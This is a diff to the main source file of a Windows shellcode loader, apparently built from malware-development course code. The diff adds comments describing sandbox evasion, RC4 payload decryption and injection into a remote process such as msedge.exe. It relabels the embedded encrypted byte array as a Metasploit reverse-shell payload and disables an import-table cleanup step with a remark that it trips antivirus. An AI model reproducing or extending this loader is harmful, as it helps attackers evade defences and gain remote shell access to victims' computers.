@@ -1,7 +1,17 @@
-// @NUL0x4C | @mrd0x : MalDevAcademy
-
 /*
 	file that contains the entry point of the loader + the rc4 encrypted payload
+    ----------------------------------
+    Purpose:
+        - Serves as the entry point for the loader application.
+        - Handles initialization of syscalls and API tables.
+        - Optionally performs anti-analysis checks to evade sandboxes and analysis environments.
+        - Decrypts the embedded RC4-encrypted payload and injects it into a target process.
+    Main Functions:
+        - Initializes system call and API tables for later use.
+        - Optionally runs anti-analysis routines (mouse click monitoring, self-deletion, delay).
+        - Decrypts and injects shellcode into a remote process (e.g., msedge.exe).
+    Role in Project:
+        - Orchestrates the overall execution flow, calling into other modules for anti-analysis, injection, and utility functions.
 */
 
 
@@ -17,18 +27,14 @@
 float _fltused = 0;
 
 
-// comment to inject to the local process
-//\
-#define TARGET_PROCESS	L"Notepad.exe"
 
 // uncomment to enable antianalysis features
-//\
-
+//
 //#define ANTI_ANALYSIS
 
 
 
-// x64 calc metasploit - encrypted 
+// reverse shell  metasploit - encrypted 
 unsigned char Rc4CipherText[] = {
         0xF4, 0x5B, 0x94, 0xA0, 0x85, 0x41, 0x7C, 0x30, 0x53, 0x33, 0x4C, 0xD2, 0x12, 0xD9, 0x80, 0x2C,
         0x3A, 0x50, 0x30, 0x98, 0x24, 0x12, 0xCB, 0x08, 0xF2, 0xAA, 0x62, 0x06, 0xF6, 0x69, 0x56, 0xE7,
@@ -62,7 +68,9 @@ unsigned char Rc4CipherText[] = {
 
 
 int main() {
-    CleanIatCamouflage();
+
+    // this is Optional, it's used to remove the IAT camouflage but eraises a flag in the AV , if you want to use it implement a new one
+    //CleanIatCamouflage();
 
     //--------------------------------------------------------------------------------------
     // Initialize syscalls (SSNs and WinAPIs)
